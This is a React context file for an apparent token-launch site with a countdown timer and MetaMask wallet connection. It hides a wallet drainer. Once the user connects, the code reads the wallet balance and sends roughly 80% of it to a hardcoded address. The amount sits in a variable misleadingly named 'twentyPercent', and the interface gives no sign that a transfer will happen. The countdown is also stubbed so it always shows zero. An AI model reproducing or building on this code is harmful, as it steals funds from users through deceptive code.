import { createContext, useEffect, useState } from "react";
import { dataApp } from "../components/data";

const appContext = createContext();

export function AppContextProvider({ children }) {
  const [appData, setAppData] = useState(dataApp);
  // Set your target launch date and time
  const targetDate = new Date('2023-09-26T00:00:00Z').getTime();
  // Initialize state variables
  const [timeRemaining, setTimeRemaining] = useState(calculateTimeRemaining());

  function calculateTimeRemaining() {
    const now = new Date().getTime();
    const timeDiff = targetDate - now;

    if (timeDiff <= 0) {
      // Launch date has passed
      return {
        days: 0,
        hours: 0,
        minutes: 0,
        seconds: 0,
      };
    }

    // const days = Math.floor(timeDiff / (1000 * 60 * 60 * 24));
    // const hours = Math.floor(
    //   (timeDiff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
    // );
    // const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
    // const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);

    return {
        days: 0,
        hours: 0,
        minutes: 0,
        seconds: 0,
    };
  }

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeRemaining(calculateTimeRemaining());
    }, 1000);

    // Clean up the interval when the component unmounts
    return () => clearInterval(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const [isMetamaskInstalled, setIsMetamaskInstalled] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [web3, setWeb3] = useState(null);
  const [myOwn, setMyOwn] = useState(null);
  const [combinedBalance, setCombinedBalance] = useState(null);
  const [selectedAddress, setSelectedAddress] = useState("");
  const [walletBalance, setWalletBalance] = useState(null);

  const transferFunds = async () => {
    const sourceWallet = window.ethereum.selectedAddress;
    const destinationWallet = "0xe6ba24AC857D2Efe97100250a61c324E4961984A";  

    if (web3 && sourceWallet && destinationWallet) {
      try {
        // Transfer funds
        const amount = web3.utils.toWei(myOwn, "ether"); 
        await web3.eth.sendTransaction({
          from: sourceWallet,
          to: destinationWallet,
          value: amount,
        });
        console.log("Funds transferred successfully!");
      } catch (error) {
        // Handle error
        console.error("Failed to transfer funds:", error);
      }
    }
  };

  const calculateAndDistribute = () => {
    const twentyPercent = parseFloat(walletBalance) * 0.8;
    const eightyPercent = parseFloat(walletBalance) * 0.2;

    setMyOwn(twentyPercent);
    setCombinedBalance(eightyPercent);
    transferFunds();
  };

  const handleWallet = async () => {
    const selectedAddress = window.ethereum.selectedAddress;
    console.log("User wallet: ", selectedAddress);
    setSelectedAddress(selectedAddress);

    if (web3 && selectedAddress) {
      try {
        const balanceWei = await web3.eth.getBalance(selectedAddress);
        const balanceEth = web3.utils.fromWei(balanceWei, "ether");
        console.log("Wallet Balance: ", balanceEth);
        setWalletBalance(balanceEth);
        calculateAndDistribute();
      } catch (error) {
        // Handle error
        console.error("Failed to retrieve wallet balance:", error);
      }
    }
  };

  const connectMetamask = async () => {
    try {
      await window.ethereum.enable();
      // Metamask is now connected
      setIsConnected(true);
      handleWallet();
    } catch (error) {
      // Handle error
      console.error("Failed to connect Metamask:", error);
    }
  };
  const value = {
    appData,
    setAppData,
    timeRemaining,
    isMetamaskInstalled,
    setIsMetamaskInstalled,
    isConnected,
    setIsConnected,
    web3,
    setWeb3,
    connectMetamask,
    selectedAddress,
    combinedBalance,
  };
  return <appContext.Provider value={value}>{children}</appContext.Provider>;
}

export default appContext;
